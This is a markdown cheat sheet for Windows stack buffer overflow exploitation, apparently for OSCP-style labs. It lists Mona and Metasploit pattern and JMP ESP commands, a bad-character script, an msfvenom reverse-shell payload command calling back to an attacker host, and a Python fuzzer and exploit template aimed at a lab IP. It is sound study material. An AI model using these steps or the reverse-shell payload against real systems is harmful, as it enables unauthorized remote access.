# System Security

### Pattern Create/Offset

[Pattern Create/Offset github](https://github.com/ickerwx/pattern)

Usage:

```bash
$ ./pattern create 2048
```
```bash
$ ./pattern offset 0x67433966
```

Metasploit
```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb
```

[Mona Plugin](https://github.com/corelan/mona)

Usage :
```Mona
!mona pc 2048
```
```Mona
!mona po 0x67433966
```


### Mona Commands

Installation :
Copy `mona.py` file into **PyCommand** folder inside **Imunity Debugger** installation folder.

Then set working folder for **Mona** :
```Mona
!mona config -set workingfolder C:\ImmunityLogs\%p
```


Once application crashes and **EIP** is overwriten, run following command to provide **Metasploit** Module for exploiting the application :

```
!mona suggest
```


List of avalable modules used by application :
```Mona
!mona modules
```

List of modules, which have not ASLR enabled :
```Mona
!mona noaslr
```




### Finding Bad Characters


```Python
#!/usr/bin/env python
from __future__ import print_function

for x in range(1, 256):
    print("\\x" + "{:02x}".format(x), end='')

print()
```


**Generate bytearray.bin** 
```Mona
!mona bytearray -b "\x00"
```


**Compare**
```Mona
!mona compare -f C:\mona\oscp\bytearray.bin -a <ESP_address>
```


> [!NOTE]
> Remember that badchars can affect the next byte as well!




### CALL ESP / JMP ESP

[findjmp2](https://github.com/nickvido/littleoldearthquake/blob/master/corelan/findjmp/findjmp2.c) 

usage :
```Powershell
.\findjmp.exe kernel32.exe esp
```

[Mona Plugin Documentation](https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/)

Usage :
```Mona
!mona jmp -r esp -m kernel
```
```Mona
!mona jmp -r esp -m kernel32.dll
```
```Mona
!mona jmp -r esp -cpb "\x00"
```

> [!Note]
>  In order to correctly write this address, we will have to write it in little-endian.


## MSFVenom

Payload :
```
msfvenom -p windows/shell_reverse_tcp LHOST=[attack machine IP] LPORT=4444 -f c  -b "\x00\x0A\x0D" 
```





## Exploits

**Fuzzer**
```python
#!/usr/bin/env python3

import socket, time, sys

ip = "10.10.33.182"

port = 1337
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```


**Exploit**
```Python
#!/usr/bin/env python3
import socket

ip = "10.10.33.182"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```
